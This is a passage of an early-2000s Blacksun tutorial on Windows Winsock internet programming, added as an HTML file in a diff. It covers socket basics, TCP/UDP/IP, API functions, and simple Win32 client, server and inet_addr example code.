@@ -1,0 +1,3469 @@
+<html>
+<body>
+<pre>
+<font color=red>
+              _________________
+             /_               /\  
+              \/  _______    /  \
+              /  /      /   /   /
+             /  /______/   /   /
+            /           __/   /
+           /  _______   \  __/
+          /  /      /   /  \
+         /  /______/   /   / 
+       _/             /   /      
+      /______________/   /       BLACK SUN RESEARCH FACILITY
+      \              \  /      	   <a href="http://blacksun.box.sk">HTTP://BLACKSUN.BOX.SK</a>
+       \______________\/
+
+
+</font>
+
+
+WINDOWS INTERNET PROGRAMMING
+=================================================
+
+
+
+   WRITTEN BY                 [ <a href="mailto:cos125@hotmail.com">cos125@hotmail.com</a>                :E-MAIL    ]      
+           <a href="mailto:cos125@hotmail.com">BINARY RAPE</a>        [ 114603188                         :ICQ#      ]      
+                              [ <a href="http://www.geocities.com/wininetprogram">www.geocities.com/wininetprogram</a>  :WEB SITE  ]
+                              [ <a href="http://blacksun.box.sk">http://blacksun.box.sk</a>            :TURORIALS ]      
+
+
+
+
+
+Thanks to cyberwolf for letting me write this and BSRF for releasing it.
+
+
+
+Disclaimer
+=======================================
+
+None of the information or code in this tutorial is meant to be used against others
+or to purposely damage computer systems or cause any loss of or damage to property.
+
+Further more neither myself or any other contributor to, or member of, the Blacksun
+research Facility (BSRF) can be held responsible for damage or loss of property of
+computer systems as a result of this tutorial.
+
+In this tutorial the code is provided as a learning aid so you can see how its done
+its not meant for you to use against yourself or others.
+
+Also in the Exercises sections you are encouraged to alter the code and improve it.
+I say create or build a program to do something not create or build a program to do
+something and use it for that purpose.
+
+
+CONTENTS
+=======================================
+
+1.  Introduction
+2.  Different types of Sockets
+3.  Protocols
+   
+    3.1 What is TCP
+    3.2 What is UDP - An alternative
+    3.3 Introducing IP - The main protocol
+    3.4 TCP and UDP common functions
+    3.5 UDP specific functions
+    3.6 TCP specific functions
+    3.7 Structures
+    3.8 Converting
+    3.9 The application layer
+
+4.  Clients and servers
+
+    4.1 Bracaman's Server example - Win32
+    4.2 Bracaman's Client example - Win32
+
+5.  Exploring the Winsock
+   
+    5.1 Looking at inet_addr()
+    5.2 Looking at htons()
+    5.3 Exploring Winsock functions
+
+    [ EXERCISES ]
+
+6.  Common Internet Programs
+
+    6.1 DNS
+    6.2 Port Scan
+    6.3 Nuker
+
+    [ EXERCISES ]
+
+7.  E-Mail - SMTP
+
+    [ EXERCISES ]
+
+8.  WinInet - FTP
+
+    [ EXERCISES ]
+
+9.  Another Protocol - ICMP
+
+    [ EXERCISES ]
+
+10. Other Internet code
+
+    10.1 Internet connections
+    10.2 CGI Programming
+
+    [ EXERCISES ]
+
+11. Last Words
+
+
+    Questions And Answers
+
+
+    APPENDIXES 
+
+    A - The Compiler
+    B - IP and Port Numbers
+    C - Servers and Clients
+    D - Routers and Gateways
+    E - Further reading
+    F - Code
+
+
+
+________________________________________________________________________________________________________
+
+
+1.0 INTRODUCTION
+=======================================
+
+Welcome to Windows Internet Programming Part 1, the demented ramblings of a drunken Irish man.
+
+
+Learning Internet programming can be very useful in many areas, not just for programmers that 
+wish to expand their knowledge but also to network administrators who should be more familiar
+with how it all works and students who need to learn quick or they will fail their exams ;).
+
+Even if you just want to learn programming as a hobbie then internet programming is a very easy
+way to get more power over connections and to better understand whats really going on underneath
+the hood of the internet.
+
+The language of choice in this tutorial is c++ and the compiler is microsoft visual c++. To find
+out how to set up your compiler for internet programming skip on ahead to Appendix A - The Compiler.
+
+If you are not familiar with several topics on the internet such as the following:
+
+1. IP address's and Port numbers.
+2. Server and client relationships.
+3. Routers and Gateways.
+
+Then I suggest you at least read the sections Appendix B, Appendix C and Appendix D,
+or goto Appendix E - Further Reading.
+
+The protocols TCP, UDP, ICMP and IP are going to be discussed in the following sections but
+they will all be addressed as we meet them so don't worry too much about them right now :).
+
+Most of the following sections have an Exercises section at the end, just some suggestions about what
+to do with the code after you read the section.
+
+Youy are free to distribute the code that I write in this tutorial and this tutorial itself but
+remember you must keep it intact. Use this file as a reference for anything you want even your own
+papers or tutorials but please let me know if you do, id just like to know if this tutorial is of use
+to you.
+
+Ive made a website to coincide with this, and future tutorials and it should have a mailing list on it to,
+this website will have articles and source code that are like add-on's to the tutorial, even when its finished.
+The site should deal with internet technologies and programming in general as well as this tutorial.
+
+The url is available at the top of the page (^ UP THERE ^).
+
+There should be more additions to this tutorial soon as this is only version 1.0.
+
+Feel free to send comments, questions and suggestions to me at my e-mail address above or add me to your
+icq list.
+
+Well without further adue Please read on as because im about to send this e-mail onto cyberwolf because
+he keeps giving out to me for it being late :).
+
+
+(Sorry cyber ive just been having alot of sex the last couple of weeks)
+
+________________________________________________________________________________________________________
+
+
+2.0 DIFFERENT TYPES OF SOCKETS
+=======================================
+
+There are 2 different main types of Sockets.
+
+1. Streaming sockets.
+2. Datagram  sockets.
+
+Programming TCP and UDP from scratch is difficult and involves alot of overhead. For this reason 
+the idea of sockets were created. The socket paradigm was developed at the University of California 
+at Berkelely. These sockets were designed for unix and similiar operating systems. In January of 1993 
+the Winsock was created to keep Bill Gates feet warm.. nnaahhh winsock is short for Windows Sockets 
+and is an implementation of Berkeley sockets but designed to take advantage of Windows message driven
+architecture.
+
+
+The winsock API was designed quickly in order to get it out as early as possible and therefore the 
+scope of the architecture mostly focused on TCP/IP but could still implement protocols such as 
+UDP (thankfully!).
+
+Because Windows Sockets is based on the same sockets as unix, porting is quiet easy between the two, 
+we'll cover porting and multiple platform support in a later tutorial.
+
+The Winsock is implemented trough the Winsock32.DLL in one of you system folders. It acts as a 
+layer between you (the programmer) and the hardware level (where packet generation and so on takes place).
+
+You provide some perameters for the winsock such as the contents of the datagram, the target IP 
+address and the target port number and by calling some functions like sendto(); or recvfrom(); the 
+winsock creates the neccessary packets and sends or recieves datagrams.
+
+The current version of Winsock is 2.0 and it takes more advantage of windows messaging and implements 
+better support for protocols other than TCP/IP.
+
+
+
+      +----------------------+    +-------------------------+      	Your Application
+      |                      |    |                         |
+      | Winsock2 Application |    | Winsock 1.1 Application |
+      |                      |    |                         |
+      +----------------------+    +-------------------------+
+                 |                                  |
+                 |                                  |
+                 |                                  |
+      +-----------------------------------------------------+      	The Winsock
+      |         Wsock32.dll - The Winsock DLL               |
+      +-----------------------------------------------------+
+                                |
+                                |
+                                |
+      +-----------------------------------------------------+      	The Transport Layer
+      |                The Hardware Layer                   |
+      +-----------------------------------------------------+
+
+
+      FIG 1. - How your program and sockets talk.
+
+
+________________________________________________________________________________________________________
+
+
+3.0 PROTOCOLS
+=======================================
+
+There are several protocols that we use in internet programming.
+The first is IP and this is the base layer for Protocol programming.
+The next 2 protocols are TCP, which is orientated with streaming sockets,
+and then theres UDP which is orientated around datagram sockets.
+
+Using these protocols we can build programs which run on the application layer and form
+protocols such as FTP and HTTP.
+
+
+3.1 WHAT IS TCP?
+=======================================
+
+TCP is the Transmission Control Protocol.
+
+TCP is a protocol developed to make sure that packets were not lost on the internet as routers sent them 
+from computer to computer. You see when you want to send a file across the internet trough TCP you send
+the file to the "TCP stack" (which is just another way of saying the Winsock).
+
+TCP then splits up the file into little pieces, each piece is called a datagram, the size of each piece
+depends on how good the tcp is on your computer and on the computer your sending the file to.
+
+So if your computer can handle datagrams that are 1 kb large and smaller and your friends computer can 
+handle datagrams that are 500 bytes large and smaller, your TCP will divide a file into datagrams that 
+are 500 bytes largeso that both your computer and your friends can handle the size of the datagrams.
+
+Otherwise it would be like trying to push a triangular peg into a round hole, it wouldn't fit.
+The same as trying to squeeze digital larceny's mother into a normal bus seat, her ass is just too fat.
+
+Now TCP was designed to keep track of every piece that it sends and to do so it numbers every datagram 
+that it creates, so we have 3 datagrams from a 1.5 kb file, first datagram is numbered 0, second 500 and
+third is 1500.
+
+Thanks to this numbering feature and some built in error checking functions TCP ensures that when you 
+send the datagrams A, B and C in that order they arrive in the order A B C and not something like C A B.
+
+But how does TCP store these numbers? These numbers along with other information about the datagram, 
+such as the IP address and port number of where its being sent, is stored in something called a header.
+
+A Datagram is wrapped up in a Header which contains information, this is why TCP was created, to store
+and control the safe sending and recieving of Datagrams across the internet.
+
+So with this example in mind say if I wanted to send a 1.5 kb file to a friend. Its a fairly small file 
+compared to most but still big enough that it needs to be split up by TCP.
+
+
+
+      +-----------------+      	File before being sent
+      |   1.5 kb file   |
+      +-----------------+
+               |
+         +-----+------+
+         |     |      |
+      +----+-----+------+      	File split into datagrams on a 500 byte TCP connection
+      | 0  | 500 | 1500 |
+      +----+-----+------+
+        |     |      |
+        |     |      |
+      +----+-----+------+      	TCP headers wrapped around Datagrams
+      | H  |  H  |  H   |
+      +----+-----+------+
+      | 0  | 500 | 1500 |
+      +----+-----+------+
+
+
+
+      FIG 2. - TCP spliting a file into datagrams and wrapping them in their header.
+
+
+3.2 WHAT IS UDP - AN ALTERNATIVE
+=======================================
+
+UDP was designed as an alternative to TCP, only problem is while TCP has built in error checking and
+ensures that your file is recieved just the same way as it was sent UDP doesn't it just sends out its
+datagrams and lets them find their own way to the host.
+
+With TCP your quarenteed your sending A B C to a person but with UDP it could be more like B A C.
+
+Because of this UDP is considered unreliable and is not counted on for important transfers.
+Still UDP is not as bad as every-one says and the error rate is kinda low, still for important transfers
+you just can't count on 'kinda' low.
+
+UDP is better used on lan's and ethernet's than the internet because on these smaller networks it is
+extremely rare that you would loose a datagram.
+
+So if it is so unreliable why was it created?
+
+Well there is a reason UDP is unreliable, it sacrifices its reliability for speed. There are many cases
+where UDP is a definite advantage such as when you only need one datagram sent, then you wouldnt need to
+worry whether A B C arrived in order cos' your only sending A.
+
+UDP wraps datagrams in its own header for transmission, these headers are smaller and contain less info
+than TCP headers but like I said sometimes UDP is a definite advantage.
+
+
+3.3 INTRODUCING IP - THE MAIN PROTOCOL
+=======================================
+
+IP stands for Internet Protocol and all other protocols such as TCP and UDP ride piggy back on it.
+IP doesn't divide files up into datagrams and the like it already has that job done for it by TCP and UDP.
+
+IP is sent the datagram with a header wrapped around it (either a TCP or UDP header it doesn't matter),
+and it wraps its own header around it.
+
+Now we have a datagram with 2 seperate headers wrapped around it, the TCP header and the IP header.
+This formation is known as an IP Packet. All information, e-mails, web-pages, messages and files are sent
+across the internet in IP Packets.
+
+IP headers are used to provide information to routers as opposed to, say for example TCP, whose headers
+are meant for servers and clients to tell them how to put datagrams together.
+
+The IP header contains information like the IP# and port number of the host its being sent to, which it 
+extracts from the TCP or UDP header, so that it can tell the routers where it wants to go.
+
+The TTL is the Time To Live of the packet we are sending. Rather than the time to live specifying the 
+amount of time in seconds or minutes that the packet exists for it contains a number which states how many 
+routers the packet can meet before it is destroyed. The TTL is a number specified by you (the programmer).
+
+For example if we set the time to live field as 10 in the IP header then the packet can meet ten 
+routers before it is destroyed. Each router that the packet meets subtracts 1 from the number so that after 
+the packet meets the first router the TTL will be equal to 9 and after the second it will be 8.
+
+When the TTL hits 1 the router subtracts 1, gets 0 and throws away the packet, this is to ensure that 
+if a packet gets lost it wont just wander around the internet forever.
+
+
+
+      +-----------------------+
+      |       IP Header      	|
+      +-----------------------+
+      |+---------------------+|
+      ||     TCP  Header     ||
+      |+---------------------+|
+      ||+-------------------+||
+      |||                   |||
+      |||     Datagram      |||
+      |||      	          |||
+      |||                   |||
+      ||+-------------------+||
+      |+---------------------+|
+      +-----------------------+
+
+      
+      Fig 3. - Structure of an IP Packet.
+
+
+3.4 TCP AND UDP COMMON FUNCTIONS 
+=======================================
+
+TCP and UDP contain both common and different functions. All of these functions are contained within the 
+winsock.h header file (which is contained in windows.h).
+
+[ WSAStartup() ]
+
+WSAStartup() must be called every time that we start internet code in an application. This function calls
+the winsock so that we can use it. Every windows winsock program begins with this function.
+
+
+[ WSACleanup() ]
+
+Like WSAStartup();, WSACleanup(); must be called in every winsock program, it however is called at the end 
+of the code as opposed to the beginning like startup(); is. This function is the equivilant to unix's,
+close() and shutdown() functions.
+
+Its very important that every single WSAStartup() has a corresponding WSACleanup().
+
+
+[ Socket() ]
+
+The next important function is socket(); and is used by both protocols. This function contains 3 parameters,
+
+1. Domain
+2. Type
+3. Protocol
+
+
+1. Domain   - There are several values you can set domain to depending on the purpose of the socket.
+              In this tutorial were going to set the domain to AF_INET in order to use internet protocols.
+
+2. Type     - The value of type depends on what sockets you use. Remember there are 2 types of sockets,
+              Streaming and Datagram. TCP is stream orientated and UDP is datagram orientated. Therefore
+              if we wish to use TCP we set the type to SOCK_STREAM and if we want to use UDP we set it to
+              SOCK_DGRAM
+
+3. Protocol - This isn't important we can set it to 0.
+
+
+Once we create the socket trough this function we can read and write to and from it. So anything we send to
+the socket is transmitted across the internet connection and anything sent to us can be read from the connection.
+
+
+[ closessocket() ]
+
+closesocket() function is used to close a socket that you have already created.
+This function has 1 parameter, the name of the socket you created.
+
+1. Socket   - The name of the socket you declared.
+
+
+This function closes the socket and once called no more reading or writing can be made to the socket.
+To use this function you must first declare socket. Any-1 that try's to read or write to the socket
+will recieve errors once this function is called.
+
+
+[ gethostbyname() ]
+
+This function returns the IP address of a host, for example;
+
+gethostbyname("www.microsoft.com");
+
+would return the IP address of the misrosoft website. This function is whats behind the DNS program and 
+theres many occassions when obtaining the unknown IP address of a website can be useful in programming.
+
+
+[ gethostbyaddr() ]
+
+This function does the opposite of gethostbyname(). In this function we pass an IP address as the parameter 
+and a host name is returned.
+
+
+3.5 UDP SPECIFIC FUNCTIONS 
+=======================================
+
+Unlike the previous section which contained functions used by both UDP and TCP applications this section 
+contains functions which are specific to UDP, that is you only use them in a program that is using UDP as 
+the protocol of choice.
+
+
+[ sendto() ]
+
+The sendto() function is used to send datagrams across the connection we have established and we pass it 6
+parameters.
+
+1. Sock        	-  The socket that weve made earlier.
+2. Msge           -  The information we want to send.
+3. Len      	-  The length of the information we wish to send.
+4. Flags      	-  This is set to 0.
+5. To      	      -  The pointer to struct sockaddr.
+6. Tolen      	-  The sizeof(struct sockaddr).
+
+
+sendto() returns the number of bytes sent and returns -1 on error.
+
+
+[ recvfrom() ]
+
+This is sendto() 's counterpart, where we use sendto() to send information and write to a socket, we use 
+recvfrom() to read from that socket and recieve information from a computer on the internet.
+
+1. Sock      	-  The socket that weve made earlier.
+2. Buf      	-  The buffer to read information into.
+3. Len      	-  The maximum length of the buffer.
+4. Flags      	-  This is set to 0.
+5. From      	-  The pointer to struct sockaddr
+6. Fromlen      	-  The pointer to an int with the value of sizeof(struct sockaddr)
+
+
+recvfrom() returns the number of bytes recieved and returns -1 on error.
+
+
+3.6 TCP SPECIFIC FUNCTIONS 
+=======================================
+
+Like UDP, TCP has 2 specific fuctions for sending and receiving information on the internet,
+these functions look very similiar but dont have as many parameters.
+
+[ send() ]
+
+send() is the same as UDP's sendto() and has 4 parameters.
+
+1. Sock        	-  The same as sendto().
+2. Msge           -  The same as sendto().
+3. Len      	-  The same as sendto().
+4. Flags      	-  The same as sendto().
+
+
+send() returns the number of bytes sent and returns -1 on error.
+
+
+[ recv() ]
+
+recv() is the same as UDP's recvfrom() and has 4 parameters.
+
+1. Sock        	-  The same as recvfrom().
+2. Msge           -  The same as recvfrom().
+3. Len      	-  The same as recvfrom().
+4. Flags      	-  The same as recvfrom().
+
+
+recv() returns the number of bytes recieved and returns -1 on error.
+
+
+Unlike UDP, TCP is a connection orientated protocol, what this means is that you first must form a 
+connection with the host before you can begin sending and recieving information to one another.
+
+TCP has several specific functions for forming this connection.
+
+
+[ connect() ]
+
+After we start up the winsock in a TCP application and set up the socket we must call this function
+in order to form the connection.
+
+It has 3 parameters.
+
+1. Sock      	-  The socket that weve made earlier.
+2. To      	      -  The pointer to struct sockaddr.
+3. ToLen      	-  The sizeof(struct sockaddr).
+
+
+You will recognise all of these parameters from earlier and theres nothing new to explain here.
+
+This function is used to connect to an IP address on a defined port and returns -1 on error.
+
+
+TCP again varies from UDP by requiring special functions when creating a server.
+These are bind() and listen().
+
+
+[ bind() ]
+
+bind() has 3 parameters.
+
+
+1. Sock      	-  The socket that weve made earlier.
+2. My_addr      	-  The pointer to struct sockaddr.
+3. ToLen      	-  The sizeof(struct sockaddr).
+
+
+bind() is used to form a connection to a port on your own computer. All servers have specific ports,
+an http servers port is 80 and an ftp servers port is 21.
+
+With servers we must bind() to a specific port so that clients know how to talk to us. When I bind();
+to port 13 all IP packets sent to port 13 on my computer are directed to my program.
+
+
+[ listen() ]
+
+listen() only contains 2 parameters.
+
+
+1. Sock      	-  The socket that weve made earlier.
+2. BackLog      	-  The number of connections allowed.
+
+
+We use listen() when we are waiting for a connection. You must call bind() before listen() so the
+program knows what port it is supposed to be listening to for packets.
+
+
+3.7 STRUCTURES
+=======================================
+
+There are several structures used in winsock programming to make referencing objects that much easier.
+
+
+[ sockaddr ]
+
+You'll notice that in the last section I refered to "struct sockaddr" but what is it?
+
+sockaddr is a c++ structure which holds 2 pieces of information about the socket.
+
+1. Sa_family      -  The address family.
+2. Sa_data[14];      -  14 bytes of the protocol address.
+
+
+[ sockaddr_in ]
+
+Another structure is sockaddr_in which we use to reference elements of the socket.
+
+1. Sin_family     -  The address family.
+2. Sin_port      	-  The Port number.
+3. Sin_addr      	-  The Internet Address.
+
+
+sin_family is usually set to AF_INET in most programs. It tells the program what kind of network its going
+to be used for, in this case AF_INET (the internet).
+
+sin_port is a number used for the internet connection such as 80.
+sin_addr is the internet address to be used in the connection such as 127.0.0.1.
+
+
+[ hostent ]
+
+The final structure we are going to look at is hostent.
+This structure is used to refer to remote hosts, like www.microsoft.com or blacksun.box.sk.
+
+This structure is most commonly used to find the IP address or the host name of a remote computer.
+
+We can reference information mainly by using only 1 part.
+
+1. Hostent->h_name
+
+This is used to get the IP number when provided the host name.
+
+
+The rest of the structure isn't important right now but we may cover it later.
+
+
+3.8 CONVERTING
+=======================================
+
+[ htons() ]
+
+Theres a little problem with numbers on the internet, intel chips store them one way and motorola
+chips store them a different way. So how do we make sure that our programs can work alongside macintosh
+computers which use the motorola chip? There is a function called htons() which will convert the number
+thankfully and its really easy to use.
+
+This function has only 1 paramater
+
+1. Port      	-  The port number.
+
+It takes the port number we pass to it and converts it, saving us from annoying overhead.
+We'll use htons() later when we have to fill up structures.
+
+
+[ inet_addr ]
+
+Before we can fill up our structures tough we first have to supply an IP address and in order for the
+program to do this we must convert the address into an unsigned long.
+
+To do this we pass the IP address to the function inet_addr() as its only parameter.
+
+1. Address      -  The IP Address.
+
+
+3.9 THE APPLICATION LAYER
+=======================================
+
+Mostly on the internet you'll hear things like ftp and http and how they are protocols. This is true
+as what a protocol is, is a defined set of rules on how to interact, like a certain way for 2 computers
+to talk to eachother.
+
+These protocols however are not quiet the same as TCP or UDP, just as those 2 aren't the same as IP.
+
+We can seperate and define these protocols by placing them in layers. IP is the base layer the one where
+most fundamental communication takes place (getting from one place to another), and protocols like
+TCP are built on top of IP so they are on a different layer. The same way FTP and HTTP are built on top
+of TCP so they are on a higher level.
+
+This can best be shown with a diagram I think (or maybe its not I just like making diagrams ;),).
+
+
+
+      +-------------------+
+      | Application Layer |      -  FTP, HTTP.
+      +-------------------+
+      |  Transport Layer  |      -  TCP, UDP.
+      +-------------------+
+      |  Protocol  Layer  |      -  IP.
+      +-------------------+
+      |  Hardware  Layer  |      -  Network Card.
+      +-------------------+
+
+
+
+      Fig 4. - Protocol Layering.
+
+
+The Hardware Layer is of course where packets are created and everything on the network and ethernet
+cards themselves.
+
+
+________________________________________________________________________________________________________
+
+
+4.0 CLIENTS AND SERVERS
+=======================================
+
+Since this tutorial is trying to run parallel to BracaMans unix sockets tutorial (also available from 
+blacksun.box.sk).
+
+We are going to use the same programs as in his tutorial except ported for use in windows.
+
+
+
+4.1 BRACAMANS SERVER EXAMPLE - WIN32
+=======================================
+
+
+/* <---- SOURCE CODE STARTS HERE ----> */
+
+#include <windows.h>
+#include <winsock.h>
+#include <stdio.h>
+
+#define PORT 3550   /* Port that will be opened */ 
+#define BACKLOG 1   /* Number of allowed connections */
+
+
+struct sockaddr_in server; /* server's address information */
+struct sockaddr_in client; /* client's address information */
+
+int sin_size;
+
+
+WSADATA  wsdata;
+SOCKET   fd, fd2;
+DWORD    wsock;
+
+
+LRESULT CALLBACK recall (HWND, UINT, WPARAM, LPARAM);
+
+int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine, int iCmdShow)
+
+{
+      static TCHAR szAppName[] = TEXT("Server");
+
+      HWND      	hwnd;
+      MSG      	msg;
+      WNDCLASS      wndclass;
+
+      wndclass.style          = CS_HREDRAW | CS_VREDRAW;
+      wndclass.lpfnWndProc    = recall;
+      wndclass.cbClsExtra     = 0;
+      wndclass.cbWndExtra     = 0;
+      wndclass.hInstance      = hInstance;
+      wndclass.hIcon      	= LoadIcon (NULL, IDI_APPLICATION);
+      wndclass.hCursor      	= LoadCursor (NULL, IDC_ARROW);
+      wndclass.hbrBackground  = (HBRUSH) GetStockObject (WHITE_BRUSH);
+      wndclass.lpszMenuName   = NULL;
+      wndclass.lpszClassName  = "Server";
+      
+      RegisterClass (&wndclass);
+
+      hwnd = CreateWindow (szAppName,      	// Windows Class Name
+      	      	 "Server",      	      // Windows Caption
+      	      	 WS_OVERLAPPEDWINDOW,   // Windows Style
+      	      	 CW_USEDEFAULT,      	// initial x position
+      	      	 CW_USEDEFAULT,      	// initial y position
+      	      	 200,      	      	// initial x size
+      	      	 200,      	      	// initial y size
+      	      	 0,      	      	// parent window handle
+      	      	 0,      	      	// parent menu handle
+      	      	 hInstance,      	      // program instance handle
+      	      	 0);      	      	// creation parameters
+
+
+      ShowWindow(hwnd, iCmdShow);
+
+      while (GetMessage (&msg, NULL, 0, 0))
+      {
+      	DispatchMessage  (&msg);
+      }
+      return 1;
+}
+
+
+LRESULT CALLBACK recall (HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
+{
+if (message == WM_LBUTTONDOWN)
+{   
+   WSAStartup(0x0101,&wsdata);  
+
+   if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1 )  /* calls socket() */
+   {
+         MessageBox(0,"Socket Error","Error",0);
+         return -1;
+   }
+
+      	      	server.sin_family      	= AF_INET;         
+      	      	server.sin_port      	= htons(PORT);          /* Remember htons() from "Conversions" section? =) */
+      	      	server.sin_addr.s_addr      = INADDR_ANY;       /* INADDR_ANY puts your IP address automatically */
+
+   if(bind(fd,(struct sockaddr*)&server,sizeof(struct sockaddr)) == -1) /* calls bind() */
+   { 
+         MessageBox(0,"Bind Error","Error",0);
+            return -1;
+   }    
+
+
+   if(listen(fd,BACKLOG) == -1) /* calls listen() */
+   { 
+         MessageBox(0,"Listen Error","Error",0);
+            return -1;
+   }
+
+
+      while(1)
+      {
+      sin_size = sizeof(struct sockaddr_in);
+      if ((fd2 = accept(fd,(struct sockaddr *)&client,&sin_size)) == -1) /* calls accept() */
+      
+      {
+
+         MessageBox(0,"Accept Error","Error",0);
+         return -1;
+
+      }
+  
+         MessageBox(0,"Client connected to server.","Connection",0);
+
+
+         send(fd2,"Welcome to my server.\n",22,0); /* send to the client welcome message */
+
+   WSACleanup();
+
+   return -1;
+
+}
+}
+
+      if (message == WM_DESTROY)
+      	PostQuitMessage(0);
+
+      return DefWindowProc(hwnd, message, wParam, lParam);
+}
+
+
+/* <---- SOURCE CODE ENDS HERE ----> */
+
+
+
+This is the same code as the streaming server in bracamans tutorial, except this has been ported to windows,
+the names bracaman uses in the program and the comments are the same.
+
+
+4.2 BRACAMANS CLIENT EXAMPLE - WIN32
+=======================================
+
+And of course every server has to have a client...
+
+
+/* <---- SOURCE CODE STARTS HERE ----> */
+
+
+#include <windows.h>
+#include <stdio.h>
+
+#define PORT 3550      	      	/* Port that will be opened */ 
+#define MAXDATASIZE 100      	      /* Max number of bytes of data */
+
+
+struct       hostent *he;           /* structure that will get information about remote host */
+struct       sockaddr_in server;    /* server's address information */
+
+int      numbytes;      	      /* files descriptors */
+char         buf[MAXDATASIZE];      /* buf will store received text */
+
+
+WSADATA  wsdata;
+SOCKET   sock;
+DWORD    wsock;
+
+
+LRESULT CALLBACK recall (HWND, UINT, WPARAM, LPARAM);
+
+int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine, int iCmdShow)
+
+{
+      static TCHAR szAppName[] = TEXT("Interface");
+
+      HWND      	hwnd;
+      MSG      	msg;
+      WNDCLASS      wndclass;
+
+      wndclass.style      	= CS_HREDRAW | CS_VREDRAW;
+      wndclass.lpfnWndProc    = recall;
+      wndclass.cbClsExtra     = 0;
+      wndclass.cbWndExtra     = 0;
+      wndclass.hInstance      = hInstance;
+      wndclass.hIcon      	= LoadIcon (NULL, IDI_APPLICATION);
+      wndclass.hCursor      	= LoadCursor (NULL, IDC_ARROW);
+      wndclass.hbrBackground  = (HBRUSH) GetStockObject (WHITE_BRUSH);
+      wndclass.lpszMenuName   = NULL;
+      wndclass.lpszClassName  = "Interface";
+      
+      RegisterClass (&wndclass);
+
+      hwnd = CreateWindow (szAppName,      	// Windows Class Name
+      	      	 "Interface",      	// Windows Caption
+      	      	 WS_OVERLAPPEDWINDOW,   // Windows Style
+      	      	 CW_USEDEFAULT,      	// initial x position
+      	      	 CW_USEDEFAULT,      	// initial y position
+      	      	 200,      	      	// initial x size
+      	      	 200,      	      	// initial y size
+      	      	 0,      	      	// parent window handle
+      	      	 0,      	      	// parent menu handle
+      	      	 hInstance,      	      // program instance handle
+      	      	 0);      	      	// creation parameters
+
+
+      ShowWindow(hwnd, iCmdShow);
+
+      while (GetMessage (&msg, NULL, 0, 0))
+      {
+      	DispatchMessage  (&msg);
+      }
+      return 1;
+}
+
+
+LRESULT CALLBACK recall (HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
+{
+if (message == WM_LBUTTONDOWN)
+{   
+   WSAStartup(0x0101,&wsdata); 
+   
+
+   he = gethostbyname("localhost");      	      	      	/* calls gethostbyname() */
+
+   if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1)      	/* calls socket() */
+   {
+         MessageBox(0,"Socket Error","Error",0);
+         return -1;
+   }
+
+
+      	server.sin_family = AF_INET;
+      	server.sin_port = htons(PORT);      	                /* htons() is needed again */
+      	server.sin_addr = *((struct in_addr *)he->h_addr);        /* he->h_addr passes "*he"'s info to "h_addr" */
+
+
+
+   if(connect(sock,(struct sockaddr *)&server,sizeof(struct sockaddr)) == -1) /* calls connect() */
+   {
+          MessageBox(0,"Connection Error","Error",0);
+         return -1;
+   }  
+
+
+   if ((numbytes = recv(sock,buf,MAXDATASIZE,0)) == -1)      	/* calls recv() */
+   {
+          MessageBox(0,"Receiving Error","Error",0);
+         return -1;
+   }
+
+
+   buf[numbytes]='\0';
+
+   MessageBox(0,buf,"Server Message",0); /* it prints server's welcome message =) */
+
+
+   WSACleanup();
+
+   return -1;
+
+}
+
+
+      if (message == WM_DESTROY)
+      	PostQuitMessage(0);
+
+      return DefWindowProc(hwnd, message, wParam, lParam);
+}
+
+
+/* <---- SOURCE CODE ENDS HERE ----> */
+
+
+
+Again the code is almost the exact same as the original just ported and 1 or 2 different names for things.
+
+We have covered all of this stuff already so theres nothing new here for you to learn except of course
+for how to put it all together :).
+
+As you can tell from the code, both the client and server are stream orientated, and what does this mean?
+It means that they use TCP rather than UDP as the protocol.
+
+________________________________________________________________________________________________________
+
+
+5.0 EXPLORING THE WINSOCK
+=======================================
+
+Of course its the winsock that makes all this code work and ive already told you what functions like
+htons() and inet_addr() do to numbers, but now its time to show you.
+
+
+5.1 LOOKING AT INET_ADDR
+=======================================
+
+
+/* <---- SOURCE CODE STARTS HERE ----> */
+
+
+#include <windows.h>
+#include <stdio.h>
+
+void outtie(char *p)
+{
+   FILE *fp=fopen("c:\\inet_addr.txt","a+");
+   fprintf(fp,"%s\n",p);
+   fclose(fp);
+}
+
+long      adrss;
+char      output[200];
+
+LRESULT CALLBACK recall (HWND, UINT, WPARAM, LPARAM);
+
+int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine, int iCmdShow)
+
+{
+      static TCHAR szAppName[] = TEXT("Interface");
+
+      HWND      	hwnd;
+      MSG      	msg;
+      WNDCLASS      wndclass;
+
+      wndclass.style      	= CS_HREDRAW | CS_VREDRAW;
+      wndclass.lpfnWndProc    = recall;
+      wndclass.cbClsExtra     = 0;
+      wndclass.cbWndExtra     = 0;
+      wndclass.hInstance      = hInstance;
+      wndclass.hIcon      	= LoadIcon (NULL, IDI_APPLICATION);
+      wndclass.hCursor      	= LoadCursor (NULL, IDC_ARROW);
+      wndclass.hbrBackground  = (HBRUSH) GetStockObject (WHITE_BRUSH);
+      wndclass.lpszMenuName   = NULL;
+      wndclass.lpszClassName  = "Interface";
+      
+      RegisterClass (&wndclass);
+
+      hwnd = CreateWindow (szAppName,      	// Windows Class Name
+      	      	 "Interface",      	// Windows Caption
+      	      	 WS_OVERLAPPEDWINDOW,   // Windows Style
+      	      	 CW_USEDEFAULT,      	// initial x position
+      	      	 CW_USEDEFAULT,      	// initial y position
+      	      	 200,      	      	// initial x size
+      	      	 200,      	      	// initial y size
+      	      	 0,      	      	// parent window handle
+      	      	 0,      	      	// parent menu handle
+      	      	 hInstance,      	      // program instance handle
+      	      	 0);      	      	// creation parameters
+
+
+      ShowWindow(hwnd, iCmdShow);
+
+      while (GetMessage (&msg, NULL, 0, 0))
+      {
+      	DispatchMessage  (&msg);
+      }
+      return 1;
+}
+
+
+LRESULT CALLBACK recall (HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
+{
+if (message == WM_LBUTTONDOWN)
+{   
+       adrss = inet_addr("127.0.0.1");
+
+       sprintf(output,"Internet Address = %ld",adrss);
+     outtie(output);
+}
+
+
+      if (message == WM_DESTROY)
+      	PostQuitMessage(0);
+
+      return DefWindowProc(hwnd, message, wParam, lParam);
+}
+
+
